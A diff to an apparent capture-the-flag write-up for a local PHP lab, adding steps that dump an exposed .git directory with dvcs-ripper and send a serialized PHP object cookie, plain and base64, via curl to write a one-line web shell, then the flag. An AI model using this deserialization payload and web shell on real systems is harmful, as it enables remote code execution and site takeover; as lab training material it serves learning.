@@ -312,9 +312,10 @@ https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml#level-8
 
 ## 0x1A A8 - Practice 1
 
-1. `http://127.0.0.1:8101/.git/`
-2. POST /result.php with COOKIE: `O:9:"FileClass":2:{s:8:"filename";s:8:"test.php";s:7:"content";a:1:{i:0;s:25:"<?php $_GET[1]($_GET[2]);";}}`
-
+1. `http://127.0.0.1:8101/.git/` -> `user@ubuntu:~/tmp$ ../dvcs-ripper/rip-git.pl -v -u http://localhost:8101/.git/`
+2. POST /result.php with COOKIE: `O:9:"FileClass":2:{s:8:"filename";s:4:"test";s:7:"content";a:1:{i:0;s:32:"<?php echo $_GET[1]($_GET[2]);?>";}}`
+cook=Tzo5OiJGaWxlQ2xhc3MiOjI6e3M6ODoiZmlsZW5hbWUiO3M6NDoidGVzdCI7czo3OiJjb250ZW50IjthOjE6e2k6MDtzOjMyOiI8P3BocCBlY2hvICRfR0VUWzFdKCRfR0VUWzJdKTs/PiI7fX0=
+curl --cookie "cook=Tzo5OiJGaWxlQ2xhc3MiOjI6e3M6ODoiZmlsZW5hbWUiO3M6NDoidGVzdCI7czo3OiJjb250ZW50IjthOjE6e2k6MDtzOjMyOiI8P3BocCBlY2hvICRfR0VUWzFdKCRfR0VUWzJdKTs/PiI7fX0=" http://localhost:8101/result.php
 **Flag: `CTF{51mpl3_d353r14l1z3}`**
 
 ## 0x1B A8 - Practice 2
